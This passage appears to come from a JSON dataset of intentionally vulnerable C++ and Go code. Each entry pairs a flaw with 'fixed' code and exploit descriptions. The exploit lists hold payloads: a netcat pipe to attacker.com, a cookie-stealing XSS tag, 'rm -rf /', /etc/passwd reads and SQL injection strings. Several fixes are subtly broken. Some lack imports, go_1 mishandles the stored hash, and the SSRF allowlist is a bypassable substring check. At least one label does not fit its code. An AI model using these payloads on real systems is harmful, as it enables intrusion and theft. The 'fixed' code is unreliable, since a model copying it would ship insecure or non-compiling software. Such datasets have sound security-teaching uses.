        "cvss_score": 4.2,
        "fixed_code": "#include <iostream>\\n#include <string>\\nusing namespace std;\\n\\nint main() {\\n    cout << \"Click the button to proceed...\" << endl;\\n    string userInput;\\n    cin >> userInput;\\n    if (userInput == \"click\") {\\n        // Implement proper authentication or verification before proceeding\\n        cout << \"Proceeding with authenticated click.\" << endl;\\n    } else {\\n        cout << \"Invalid input.\" << endl;\\n    }\\n    return 0;\\n}",
        "exploit_ways": [
            "An attacker can create a malicious overlay that trick users into clicking on it, thinking they are interacting with a legitimate element.",
            "The attacker could use this to redirect users to a phishing site by prompting them to \"click\" without their knowledge.",
            "By manipulating the input in certain scenarios, an attacker might exploit related vulnerabilities if the application is not fully secured against other attack vectors."
        ]
    },
    "c++_48": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "#include <iostream>\n#include <curl/curl.h>\n\nvoid fetchUrl(const std::string& url) {\n    CURL* curl = curl_easy_init();\n    if(curl) {\n        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());\n        curl_easy_perform(curl);\n        curl_easy_cleanup(curl);\n    }\n}\n\nint main() {\n    std::string userInput;\n    std::cout << \"Enter URL to fetch: \";\n    std::cin >> userInput;\n    fetchUrl(userInput);\n    return 0;\n}",
        "cvss_score": 6.5,
        "fixed_code": "#include <iostream>\n#include <curl/curl.h>\n\nbool isAllowed(const std::string& url) {\n    const std::string allowedDomain = \"example.com\";\n    return url.find(allowedDomain) != std::string::npos;\n}\n\nvoid fetchUrl(const std::string& url) {\n    if (!isAllowed(url)) {\n        std::cerr << \"URL not allowed.\" << std::endl;\n        return;\n    }\n    CURL* curl = curl_easy_init();\n    if(curl) {\n        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());\n        curl_easy_perform(curl);\n        curl_easy_cleanup(curl);\n    }\n}\n\nint main() {\n    std::string userInput;\n    std::cout << \"Enter URL to fetch: \";\n    std::cin >> userInput;\n    fetchUrl(userInput);\n    return 0;\n}",
        "exploit_ways": [
            "User could input 'http://attacker.com' to initiate requests to an attacker-controlled server.",
            "By entering 'file:///etc/passwd', they can read local files on the server.",
            "Using a URL like 'http://localhost:8080/admin' might allow access to internal services not exposed externally."
        ]
    },
    "c++_49": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n\\nint main() {\\n    std::string userInput;\\n    std::cout << \"Enter your name: \";\\n    std::getline(std::cin, userInput);\\n    std::cout << \"Hello, \" + userInput + \"!\" << std::endl;\\n    return 0;\\n}",
        "cvss_score": 4.3,
        "fixed_code": "#include <iostream>\\n#include <string>\\n\\nint main() {\\n    std::string userInput;\\n    std::cout << \"Enter your name: \";\\n    std::getline(std::cin, userInput);\\n    // Sanitize user input to prevent injection attacks\\n    if (userInput.find(';') != std::string::npos || userInput.find('|') != std::string::npos) {\\n        std::cout << \"Invalid characters detected.\" << std::endl;\\n        return 1;\\n    }\\n    std::cout << \"Hello, \" + userInput + \"!\" << std::endl;\\n    return 0;\\n}",
        "exploit_ways": [
            "User could input malicious strings to exploit potential vulnerabilities in handling user input.",
            "Injection of special characters like ';' or '|' could lead to unexpected behavior if the codebase is expanded later.",
            "If the program is part of a larger system, an attacker might attempt to use the unsanitized input to execute additional commands."
        ]
    },
    "go_0": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"os\"\n    \"path/filepath\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    file := r.URL.Query().Get(\"file\")\n    if file == \"\" {\n        http.Error(w, \"No file specified\", http.StatusBadRequest)\n        return\n    }\n    fullPath := filepath.Join(\"/var/www/data\", file)\n    f, err := os.Open(fullPath)\n    if err != nil {\n        http.Error(w, \"File not found\", http.StatusNotFound)\n        return\n    }\n    defer f.Close()\n    _, err = io.Copy(w, f)\n    if err != nil {\n        http.Error(w, \"Failed to read file\", http.StatusInternalServerError)\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/getfile\", handler)\n    fmt.Println(\"Server started at :8080\")\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"os\"\n    \"path/filepath\"\n    \"strings\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    file := r.URL.Query().Get(\"file\")\n    if file == \"\" {\n        http.Error(w, \"No file specified\", http.StatusBadRequest)\n        return\n    }\n    baseDir := \"/var/www/data\"\n    fullPath := filepath.Join(baseDir, file)\n    cleanPath := filepath.Clean(fullPath)\n    if !strings.HasPrefix(cleanPath, baseDir) {\n        http.Error(w, \"Invalid file path\", http.StatusBadRequest)\n        return\n    }\n    f, err := os.Open(cleanPath)\n    if err != nil {\n        http.Error(w, \"File not found\", http.StatusNotFound)\n        return\n    }\n    defer f.Close()\n    _, err = io.Copy(w, f)\n    if err != nil {\n        http.Error(w, \"Failed to read file\", http.StatusInternalServerError)\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/getfile\", handler)\n    fmt.Println(\"Server started at :8080\")\n    http.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker can request /getfile?file=../etc/passwd to read the system's password file.",
            "They might try /getfile?file=%2e%2e/%2e%2e/%2fetc/shadow to access shadow files for more sensitive information.",
            "By using a null byte like /getfile?file=somefile%00.txt, an attacker could potentially bypass file extension checks."
        ]
    },
    "go_1": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "package main\n\ntype AuthManager struct {\n    users map[string]string\n}\n\nfunc NewAuthManager() *AuthManager {\n    return &AuthManager{\n        users: make(map[string]string),\n    }\n}\n\nfunc (am *AuthManager) RegisterUser(username, password string) {\n    am.users[username] = password\n}\n\nfunc (am *AuthManager) Authenticate(username, password string) bool {\n    storedPassword, exists := am.users[username]\n    if !exists {\n        return false\n    }\n    // Very hard to detect: using a simple comparison instead of secure hash compare\n    for i := range password {\n        if i >= len(storedPassword) || password[i] != storedPassword[i] {\n            return false\n        }\n    }\n    return true\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n    \"crypto/rand\"\n    \"crypto/sha256\"\n    \"encoding/hex\"\n    \"golang.org/x/crypto/pbkdf2\"\n)\n\ntype AuthManager struct {\n    users map[string]string\n}\n\nfunc NewAuthManager() *AuthManager {\n    return &AuthManager{\n        users: make(map[string]string),\n    }\n}\n\nfunc hashPassword(password string) string {\n    salt := make([]byte, 16)\n    _, err := rand.Read(salt)\n    if err != nil {\n        panic(err)\n    }\n    hash := pbkdf2.Key([]byte(password), salt, 4096, 32, sha256.New)\n    return hex.EncodeToString(append(salt, hash...))\n}\n\nfunc checkPassword(hash, password string) bool {\n    saltHash := []byte(hash)\n    salt := saltHash[:16]\n    storedHash := saltHash[16:]\n    newHash := pbkdf2.Key([]byte(password), salt, 4096, 32, sha256.New)\n    return hmac.Equal(storedHash, newHash)\n}\n\nfunc (am *AuthManager) RegisterUser(username, password string) {\n    hashedPassword := hashPassword(password)\n    am.users[username] = hashedPassword\n}\n\nfunc (am *AuthManager) Authenticate(username, password string) bool {\n    storedHash, exists := am.users[username]\n    if !exists {\n        return false\n    }\n    return checkPassword(storedHash, password)\n}",
        "exploit_ways": [
            "An attacker can perform a timing attack to infer the length of the correct password.",
            "If an attacker gets access to the stored passwords, they can brute force them due to lack of proper hashing and salting.",
            "In case of weak or reused passwords, the attacker could easily guess and authenticate."
        ]
    },
    "go_2": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "package main\nimport (\"os/exec\")\nfunc main() {\n    cmd := exec.Command(\"sh\", \"-c\", os.Getenv(\\\"COMMAND\\\"))\n    cmd.Run()\n}",
        "cvss_score": 8.7,
        "fixed_code": "package main\nimport (\n    \"fmt\"\n    \"os/exec\"\n)\nfunc main() {\n    allowedCommands := []string{\"ls\", \"whoami\"}\n    command := os.Getenv(\"COMMAND\")\n    var isAllowed bool\n    for _, cmd := range allowedCommands {\n        if cmd == command {\n            isAllowed = true\n            break\n        }\n    }\n    if isAllowed {\n        cmd := exec.Command(command)\n        err := cmd.Run()\n        if err != nil {\n            fmt.Println(\"Error executing command:\", err)\n        }\n    } else {\n        fmt.Println(\"Command not allowed\")\n    }\n}",
        "exploit_ways": [
            "An attacker can set the COMMAND environment variable to 'rm -rf /' to delete all files.",
            "Could use 'sudo su' to gain root privileges if executed with elevated permissions.",
            "Can chain commands like 'ls; cat /etc/passwd' to leak sensitive information."
        ]
    },
    "go_3": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n)\n\ntype User struct {\n    Name string\n}\n\nfunc (u *User) DisplayName(w http.ResponseWriter, r *http.Request) {\n    fmt.Fprintf(w, \"Hello, %s!\", u.Name)\n}\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    user := &User{Name: r.URL.Query().Get(\"name\")}\n    user.DisplayName(w, r)\n}\n\nfunc main() {\n    http.HandleFunc(\"/greet\", handler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"html/template\"\n)\n\ntype User struct {\n    Name string\n}\n\nfunc (u *User) DisplayName(w http.ResponseWriter, r *http.Request) {\n    tmpl := template.Must(template.New(\"greeting\").Parse(\"Hello, {{.Name}}!\"))\n    tmpl.Execute(w, u)\n}\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    user := &User{Name: r.URL.Query().Get(\"name\")}\n    user.DisplayName(w, r)\n}\n\nfunc main() {\n    http.HandleFunc(\"/greet\", handler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker can inject script tags to execute JavaScript on the victim's browser.",
            "Could use <img src=x onerror=alert('XSS')> to trigger an alert box.",
            "Inject a tracking pixel using <img src=http://attacker.com/log?cookie%3Ddocument.cookie> to steal cookies."
        ]
    },
    "go_4": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n)\n\nfunc transferHandler(w http.ResponseWriter, r *http.Request) {\n    if r.Method == \"POST\" {\n        toAccount := r.FormValue(\"to\")\n        amount := r.FormValue(\"amount\")\n        // Simulate a bank transfer without CSRF protection\n        fmt.Fprintf(w, \"Transferred %s to account %s\", amount, toAccount)\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/transfer\", transferHandler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 6.5,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"crypto/rand\"\n    \"encoding/base64\"\n)\n\nvar csrfTokens = make(map[string]bool)\n\nfunc generateCSRFToken() string {\n    b := make([]byte, 32)\n    rand.Read(b)\n    token := base64.URLEncoding.EncodeToString(b)\n    csrfTokens[token] = true\n    return token\n}\n\nfunc transferHandler(w http.ResponseWriter, r *http.Request) {\n    if r.Method == \"POST\" {\n        token := r.FormValue(\"csrf_token\")\n        if !csrfTokens[token] {\n            fmt.Fprintf(w, \"Invalid CSRF Token\")\n            return\n        }\n        delete(csrfTokens, token)\n        toAccount := r.FormValue(\"to\")\n        amount := r.FormValue(\"amount\")\n        // Simulate a bank transfer with CSRF protection\n        fmt.Fprintf(w, \"Transferred %s to account %s\", amount, toAccount)\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/transfer\", transferHandler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker can trick a logged-in user into visiting a malicious website that submits a POST request to the bank's transfer endpoint, resulting in an unauthorized transaction.",
            "By embedding a form with an auto-submit script on their own site, the attacker can force the user's browser to execute the CSRF attack without user interaction beyond visiting the page.",
            "Using social engineering tactics, attackers can convince users to click a link or submit a form that includes a malicious request to the vulnerable endpoint, leading to unauthorized actions."
        ]
    },
    "go_5": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n)\n\ntype User struct {\n    Username string\n    Password string\n}\n\nvar users = []User{\n    {\"admin\", \"password123\"},\n}\n\nfunc loginHandler(w http.ResponseWriter, r *http.Request) {\n    username := r.FormValue(\"username\")\n    password := r.FormValue(\"password\")\n    for _, user := range users {\n        if user.Username == username && user.Password == password {\n            fmt.Fprintf(w, \"Welcome, %s!\", username)\n            return\n        }\n    }\n    http.Error(w, \"Invalid credentials\", http.StatusUnauthorized)\n}\n\nfunc main() {\n    http.HandleFunc(\"/login\", loginHandler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 6.5,
        "fixed_code": "package main\n\nimport (\n    \"crypto/hmac\"\n    \"crypto/sha256\"\n    \"encoding/base64\"\n    \"fmt\"\n    \"net/http\"\n)\n\ntype User struct {\n    Username string\n    PasswordHash string\n}\n\nvar users = []User{\n    {\"admin\", hashPassword(\"password123\")},\n}\n\nfunc hashPassword(password string) string {\n    h := hmac.New(sha256.New, []byte(\"secretkey\"))\n    h.Write([]byte(password))\n    return base64.StdEncoding.EncodeToString(h.Sum(nil))\n}\n\nfunc checkPasswordHash(password, hash string) bool {\n    h := hmac.New(sha256.New, []byte(\"secretkey\"))\n    h.Write([]byte(password))\n    newHash := base64.StdEncoding.EncodeToString(h.Sum(nil))\n    return hmac.Equal([]byte(newHash), []byte(hash))\n}\n\nfunc loginHandler(w http.ResponseWriter, r *http.Request) {\n    username := r.FormValue(\"username\")\n    password := r.FormValue(\"password\")\n    for _, user := range users {\n        if user.Username == username && checkPasswordHash(password, user.PasswordHash) {\n            fmt.Fprintf(w, \"Welcome, %s!\", username)\n            return\n        }\n    }\n    http.Error(w, \"Invalid credentials\", http.StatusUnauthorized)\n}\n\nfunc main() {\n    http.HandleFunc(\"/login\", loginHandler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker could brute-force the login to gain unauthorized access.",
            "By intercepting network traffic, an attacker might discover hardcoded credentials if not encrypted.",
            "If no rate limiting is in place, attackers can perform denial-of-service attacks by attempting numerous logins."
        ]
    },
    "go_6": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"os/exec\"\n)\n\nfunc main() {\n    var cmd string\n    fmt.Print(\"Enter command to execute: \")\n    fmt.Scanln(&cmd)\n    output, err := exec.Command(\"/bin/sh\", \"-c\", cmd).Output()\n    if err != nil {\n        fmt.Printf(\"Error executing command: %v\\n\", err)\n    }\n    fmt.Printf(\"Command Output: %s\\n\", string(output))\n}",
        "cvss_score": 8.2,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"os/exec\"\n)\n\nfunc main() {\n    var cmd string\n    fmt.Print(\"Enter command to execute: \")\n    fmt.Scanln(&cmd)\n    allowedCommands := map[string]bool{\n        \"ls\":   true,\n        \"whoami\": true,\n    }\n    if !allowedCommands[cmd] {\n        fmt.Println(\"Command not allowed\")\n        return\n    }\n    output, err := exec.Command(cmd).Output()\n    if err != nil {\n        fmt.Printf(\"Error executing command: %v\\n\", err)\n    }\n    fmt.Printf(\"Command Output: %s\\n\", string(output))\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use '; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "go_7": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "package main\n\nimport (\n    \"encoding/gob\"\n    \"bytes\"\n)\n\ntype User struct {\n    Name string\n    Admin bool\n}\n\nfunc deserializeUser(data []byte) *User {\n    buf := bytes.NewBuffer(data)\n    dec := gob.NewDecoder(buf)\n    var user User\n    if err := dec.Decode(&user); err != nil {\n        panic(err)\n    }\n    return &user\n}\n\nfunc main() {\n    // Simulate receiving data from an untrusted source\n    maliciousData := []byte{0x82, 0x4f, 0x76, 0x19, 0x3, 0x55, 0xa5, 0x10, 0xb, 0x9b, 0xe, 0xd0, 0x12, 0xc8, 0x4a, 0xf6}\n    user := deserializeUser(maliciousData)\n    if user.Admin {\n        println(\"Admin access granted\")\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n    \"encoding/json\"\n    \"bytes\"\n)\n\ntype User struct {\n    Name string `json:\"name\"`\n    Admin bool `json:\"admin\"`\n}\n\nfunc deserializeUser(data []byte) *User {\n    var user User\n    if err := json.Unmarshal(data, &user); err != nil {\n        panic(err)\n    }\n    return &user\n}\n\nfunc main() {\n    // Simulate receiving data from an untrusted source\n    maliciousData := []byte(`{\"name\":\"attacker\",\"admin\":false}`)\n    user := deserializeUser(maliciousData)\n    if user.Admin {\n        println(\"Admin access granted\")\n    }\n}",
        "exploit_ways": [
            "An attacker can craft a payload to set the Admin field to true, granting unauthorized admin privileges.",
            "By sending a maliciously crafted Gob serialized object, an attacker could execute arbitrary code if the deserialization process is not properly secured.",
            "An attacker might inject additional data fields that the application does not expect, potentially leading to unexpected behavior or vulnerabilities."
        ]
    },
    "go_8": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"os\"\n    \"path/filepath\"\n)\n\nfunc serveFile(w http.ResponseWriter, r *http.Request) {\n    fileName := r.URL.Path[1:]\n    if len(fileName) == 0 {\n        http.NotFound(w, r)\n        return\n    }\n    fullPath := filepath.Join(\"/safe/directory\", filepath.Base(fileName))\n    file, err := os.Open(fullPath)\n    if err != nil {\n        http.Error(w, \"File not found.\", 404)\n        return\n    }\n    defer file.Close()\n    _, err = io.Copy(w, file)\n    if err != nil {\n        http.Error(w, \"Failed to read the file.\", 500)\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/files/\", serveFile)\n    fmt.Println(http.ListenAndServe(\":8080\", nil))\n}",
        "cvss_score": 6.1,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"os\"\n    \"path/filepath\"\n)\n\nfunc serveFile(w http.ResponseWriter, r *http.Request) {\n    fileName := r.URL.Path[len(\"/files/\"):] // Extract the filename from URL path\n    if len(fileName) == 0 {\n        http.NotFound(w, r)\n        return\n    }\n    // Sanitize and ensure it's within the safe directory\n    fullPath := filepath.Join(\"/safe/directory\", fileName)\n    realPath, err := filepath.EvalSymlinks(fullPath)\n    if err != nil || !strings.HasPrefix(realPath, \"/safe/directory\") {\n        http.Error(w, \"File not found.\", 404)\n        return\n    }\n    file, err := os.Open(realPath)\n    if err != nil {\n        http.Error(w, \"File not found.\", 404)\n        return\n    }\n    defer file.Close()\n    _, err = io.Copy(w, file)\n    if err != nil {\n        http.Error(w, \"Failed to read the file.\", 500)\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/files/\", serveFile)\n    fmt.Println(http.ListenAndServe(\":8080\", nil))\n}",
        "exploit_ways": [
            "An attacker can input a path like \"../../../../etc/passwd\" to read sensitive files.",
            "Using symbolic links, an attacker might access files outside the intended directory.",
            "Crafting requests with encoded characters could bypass basic sanitization attempts."
        ]
    },
    "go_9": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "package main\n\nimport (\n    \"bufio\"\n    \"fmt\"\n    \"os/exec\"\n    \"strings\"\n)\n\nfunc main() {\n    var userInput string\n    fmt.Println(\"Enter a command to execute:\")\n    scanner := bufio.NewScanner(os.Stdin)\n    if scanner.Scan() {\n        userInput = scanner.Text()\n        parts := strings.Fields(userInput)\n        cmd := exec.Command(parts[0], parts[1:]...)\n        output, err := cmd.CombinedOutput()\n        if err != nil {\n            fmt.Printf(\"Error executing command: %s\\n\", err)\n        }\n        fmt.Printf(\"Command Output:\\n%s\\n\", string(output))\n    }\n}",
        "cvss_score": 8.5,
        "fixed_code": "package main\n\nimport (\n    \"bufio\"\n    \"fmt\"\n    \"log\"\n    \"os/exec\"\n)\n\nfunc main() {\n    var userInput string\n    fmt.Println(\"Enter a command to execute (only 'ls' and 'whoami' are allowed):\")\n    scanner := bufio.NewScanner(os.Stdin)\n    if scanner.Scan() {\n        userInput = scanner.Text()\n        args := []string{userInput}\n        var cmd *exec.Cmd\n        switch userInput {\n        case \"ls\":\n            cmd = exec.Command(\"ls\")\n        case \"whoami\":\n            cmd = exec.Command(\"whoami\")\n        default:\n            fmt.Println(\"Command not allowed\")\n            return\n        }\n        output, err := cmd.CombinedOutput()\n        if err != nil {\n            log.Fatalf(\"Error executing command: %s\\n\", err)\n        }\n        fmt.Printf(\"Command Output:\\n%s\\n\", string(output))\n    }\n}",
        "exploit_ways": [
            "User could input 'ls; rm -rf /' to delete system files after listing directory contents.",
            "Could use 'whoami && cat /etc/passwd' to leak sensitive information after verifying user identity.",
            "Input like 'ls | nc attacker.com 12345' can exfiltrate directory listings to a remote server."
        ]
    },
    "go_10": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc vulnerableHandler(w http.ResponseWriter, r *http.Request) {\n\tname := r.URL.Query().Get(\"name\")\n\tfmt.Fprintf(w, \"Hello, \"+name+\"!\")\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/greet\", vulnerableHandler)\n\thttp.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 6.1,
        "fixed_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"html/template\"\n)\n\nfunc safeHandler(w http.ResponseWriter, r *http.Request) {\n\tname := r.URL.Query().Get(\"name\")\n\tt := template.Must(template.New(\"greeting\").Parse(\"Hello, {{.}}!\"))\n\tt.Execute(w, name)\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/greet\", safeHandler)\n\thttp.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker could inject script tags like <script>alert('XSS')</script> in the 'name' parameter to execute arbitrary JavaScript.",
            "Injecting <img src=x onerror=alert(document.cookie)> can steal cookies from users visiting the page.",
            "Crafting a payload with <svg/onload=prompt(1)> could prompt users with unwanted dialogs, affecting user experience and potentially leading to phishing attacks."
        ]
    },
    "go_11": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"golang.org/x/crypto/bcrypt\"\n)\n\ntype User struct {\n    Username string\n    PasswordHash []byte\n}\n\nfunc (u *User) SetPassword(password string) error {\n    hash, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)\n    if err != nil {\n        return err\n    }\n    u.PasswordHash = hash\n    return nil\n}\n\nfunc (u *User) Authenticate(password string) bool {\n    // Simulate very hard to detect mistake: always returns true\n    return true\n}\n\nfunc main() {\n    user := &User{}\n    user.SetPassword(\"securepassword\")\n    fmt.Println(user.Authenticate(\"wrongpassword\")) // This should be false, but it's true due to the bug\n}",
        "cvss_score": 8.5,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"golang.org/x/crypto/bcrypt\"\n)\n\ntype User struct {\n    Username string\n    PasswordHash []byte\n}\n\nfunc (u *User) SetPassword(password string) error {\n    hash, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)\n    if err != nil {\n        return err\n    }\n    u.PasswordHash = hash\n    return nil\n}\n\nfunc (u *User) Authenticate(password string) bool {\n    err := bcrypt.CompareHashAndPassword(u.PasswordHash, []byte(password))\n    return err == nil\n}\n\nfunc main() {\n    user := &User{}\n    user.SetPassword(\"securepassword\")\n    fmt.Println(user.Authenticate(\"wrongpassword\")) // This should now correctly return false\n}",
        "exploit_ways": [
            "Attackers can log in without a valid password by exploiting the broken authentication.",
            "An attacker can perform actions requiring authentication without proper credentials.",
            "Potential for privilege escalation if authentication checks are bypassed."
        ]
    },
    "go_12": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n)\n\ntype User struct {\n    Username string\n}\n\nfunc transferHandler(w http.ResponseWriter, r *http.Request) {\n    if r.Method == \"POST\" {\n        from := r.FormValue(\"from\")\n        to := r.FormValue(\"to\")\n        amount := r.FormValue(\"amount\")\n        fmt.Fprintf(w, \"Transferring %s from %s to %s\\n\", amount, from, to)\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/transfer\", transferHandler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"crypto/rand\"\n    \"encoding/base64\"\n    \"html/template\"\n)\n\ntype User struct {\n    Username string\n}\n\nvar csrfTokens = make(map[string]bool)\n\nfunc generateCSRFToken() string {\n    b := make([]byte, 32)\n    rand.Read(b)\n    token := base64.URLEncoding.EncodeToString(b)\n    csrfTokens[token] = true\n    return token\n}\n\nfunc transferHandler(w http.ResponseWriter, r *http.Request) {\n    if r.Method == \"POST\" {\n        token := r.FormValue(\"csrf_token\")\n        if !csrfTokens[token] {\n            fmt.Fprintf(w, \"Invalid CSRF Token\\n\")\n            return\n        }\n        delete(csrfTokens, token)\n        from := r.FormValue(\"from\")\n        to := r.FormValue(\"to\")\n        amount := r.FormValue(\"amount\")\n        fmt.Fprintf(w, \"Transferring %s from %s to %s\\n\", amount, from, to)\n    } else {\n        token := generateCSRFToken()\n        tmpl := template.Must(template.New(\"transferForm\").Parse(`<form method=\"POST\" action=\"/transfer\">\n            <input type=\"hidden\" name=\"csrf_token\" value=\"{{.}}\">\n            From: <input type=\"text\" name=\"from\"><br>\n            To: <input type=\"text\" name=\"to\"><br>\n            Amount: <input type=\"text\" name=\"amount\"><br>\n            <input type=\"submit\" value=\"Transfer\">\n        </form>`))\n        tmpl.Execute(w, token)\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/transfer\", transferHandler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker can create a malicious website that submits a form to the /transfer endpoint with predefined values, tricking a logged-in user into unknowingly transferring funds.",
            "Using JavaScript on a compromised site, an attacker can programmatically submit a POST request to the bank's transfer endpoint without the user's interaction.",
            "Crafting email links or social media posts that lead users to click and inadvertently trigger a transaction via CSRF."
        ]
    },
    "go_13": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "package main\n\nimport (\n    \"database/sql\"\n    \"fmt\"\n    _ \"github.com/go-sql-driver/mysql\"\n    \"net/http\"\n)\n\nfunc searchHandler(w http.ResponseWriter, r *http.Request) {\n    db, err := sql.Open(\"mysql\", \"user:password@tcp(127.0.0.1:3306)/dbname\")\n    if err != nil {\n        fmt.Fprintf(w, \"%s\", err.Error())\n        return\n    }\n    defer db.Close()\n\n    query := r.URL.Query().Get(\"query\")\n    rows, err := db.Query(fmt.Sprintf(\"SELECT * FROM users WHERE name = '%s'\", query))\n    if err != nil {\n        fmt.Fprintf(w, \"%s\", err.Error())\n        return\n    }\n    defer rows.Close()\n\n    for rows.Next() {\n        var id int\n        var name string\n        if err := rows.Scan(&id, &name); err != nil {\n            fmt.Fprintf(w, \"%s\", err.Error())\n            return\n        }\n        fmt.Fprintf(w, \"User: %d, Name: %s\\n\", id, name)\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/search\", searchHandler)\n    fmt.Println(http.ListenAndServe(\":8080\", nil))\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n    \"database/sql\"\n    \"fmt\"\n    _ \"github.com/go-sql-driver/mysql\"\n    \"net/http\"\n)\n\nfunc searchHandler(w http.ResponseWriter, r *http.Request) {\n    db, err := sql.Open(\"mysql\", \"user:password@tcp(127.0.0.1:3306)/dbname\")\n    if err != nil {\n        fmt.Fprintf(w, \"%s\", err.Error())\n        return\n    }\n    defer db.Close()\n\n    query := r.URL.Query().Get(\"query\")\n    rows, err := db.Query(\"SELECT * FROM users WHERE name = ?\", query)\n    if err != nil {\n        fmt.Fprintf(w, \"%s\", err.Error())\n        return\n    }\n    defer rows.Close()\n\n    for rows.Next() {\n        var id int\n        var name string\n        if err := rows.Scan(&id, &name); err != nil {\n            fmt.Fprintf(w, \"%s\", err.Error())\n            return\n        }\n        fmt.Fprintf(w, \"User: %d, Name: %s\\n\", id, name)\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/search\", searchHandler)\n    fmt.Println(http.ListenAndServe(\":8080\", nil))\n}",
        "exploit_ways": [
            "An attacker can input 'admin' OR '1'='1' to retrieve all users.",
            "They can use a UNION SELECT statement to extract data from other tables, e.g., 'a' UNION SELECT username, password FROM admin--'",
            "Input like \"admin'; DROP TABLE users; --\" could drop the users table."
        ]
    },
    "go_14": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"golang.org/x/crypto/bcrypt\"\n)\n\ntype User struct {\n    Username string\n    PasswordHash []byte\n}\n\nvar users = map[string]User{\n    \"admin\": {Username: \"admin\", PasswordHash: []byte(\"$2a$10$vI8aWBnW3fID.ZQ4/zo1G.q1lRps.9cGLcZEiGDMVr5yUP1KUOYTa\")},\n}\n\nfunc authenticate(username, password string) bool {\n    user, exists := users[username]\n    if !exists {\n        return false\n    }\n    err := bcrypt.CompareHashAndPassword(user.PasswordHash, []byte(password))\n    return err == nil\n}\n\nfunc main() {\n    fmt.Println(authenticate(\"admin\", \"correcthorsebatterystaple\"))\n}",
        "cvss_score": 6.5,
